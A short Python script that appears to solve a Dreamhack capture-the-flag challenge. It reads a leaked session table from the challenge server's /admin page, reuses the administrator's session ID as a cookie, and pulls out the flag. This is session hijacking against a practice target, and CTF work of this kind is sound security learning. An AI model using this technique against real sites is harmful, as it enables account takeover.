import requests
import re

URL = "http://host3.dreamhack.games:11990"

resp = requests.get(URL + '/admin')

session_id=''

for key, value in resp.json().items():
    if value == 'admin':
        session_id = key


resp = requests.get(URL, cookies={'sessionid': session_id})
match = re.search(r'DH\{[^]^>]*\}', resp.text)

print(match.group(0))